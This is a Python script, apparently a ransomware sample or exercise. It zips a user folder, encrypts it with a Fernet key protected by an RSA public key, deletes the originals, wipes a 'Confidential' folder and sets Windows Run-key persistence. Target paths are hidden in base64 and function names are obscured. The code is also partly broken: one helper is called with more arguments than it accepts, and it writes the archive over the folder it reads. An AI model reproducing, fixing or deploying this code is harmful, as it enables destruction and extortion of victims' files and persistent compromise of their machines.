import rsa
from cryptography.fernet import Fernet
import os
import zipfile
import base64
import winreg

a = []

def b(d):
    with zipfile.ZipFile(d, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(d):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, os.path.dirname(d))
                zipf.write(full_path, arcname)
    print("Folder zipped.")

def c(f, generated_key):
    fernet = Fernet(generated_key)
    with open(f, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)

    encrypted_filepath = f + ".enc"
    with open(encrypted_filepath, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)
    print(f"File encrypted as {encrypted_filepath}")
    os.remove(f)
    print(f"Deleted original file {f}")

def d(confidential_folder):
    if os.path.exists(confidential_folder):
        for root, dirs, files in os.walk(confidential_folder):
            for file in files:
                file_path = os.path.join(root, file)
                os.remove(file_path)
                print(f"Deleted file: {file_path}")
        print("All files deleted.")
    else:
        print("Confidential folder does not exist.")

def e(directory_path):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            if file.endswith(('.txt', '.jpg', '.docx')):
                a.append(os.path.join(root, file))
    return a

def add_persistence():
    reg_key = winreg.HKEY_CURRENT_USER
    reg_subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_value_name = "MyScript"
    reg_value = os.path.abspath(__file__)

    with winreg.OpenKey(reg_key, reg_subkey, 0, winreg.KEY_WRITE) as reg_handle:
        winreg.SetValueEx(reg_handle, reg_value_name, 0, winreg.REG_SZ, reg_value)
    print("Persistence mechanism added.")

if __name__ == "__main__":
    folder_to_zip = base64.b64decode(b'QzpcVXNlcnNcVGVzdCAxXERlc3ktd29ya2luZyBjaGFsbGVuZ2U=').decode()
    folder_to_zip = folder_to_zip + r"/MMM"

    output_zip = base64.b64decode(b'QzpcVXNlcnNcVGVzdCAxXERlc3ktd29ya2luZyBjaGFsbGVuZ2U=').decode() + r"/mmm_backup.zip"

    generated_key = Fernet.generate_key()

    with open(r'C:/Users/Test 1/Desktop/code/key.bin', 'wb') as key_file:
        key_file.write(generated_key)

    print("AES key saved as 'key.bin'.")

    with open(r"C:/Users/Test 1/Desktop/code/public.pem", "rb") as f:
        public_key = rsa.PublicKey.load_pkcs1(f.read())

    encrypted_aes_key = rsa.encrypt(generated_key, public_key)

    with open(r'C:/Users/Test 1/Desktop/code/encrypted_aes_key.bin', 'wb') as encrypted_key_file:
        encrypted_key_file.write(encrypted_aes_key)

    print("Encrypted AES key saved as 'encrypted_aes_key.bin'.")

    b(folder_to_zip, output_zip)

    if os.path.exists(output_zip):
        c(output_zip, generated_key)

    confidential_folder = base64.b64decode(b'QzpcVXNlcnNcVGVzdCAxXERlc3ktd29ya2luZyBjaGFsbGVuZ2U=').decode() + r"/Confidential"
    d(confidential_folder)

    add_persistence()
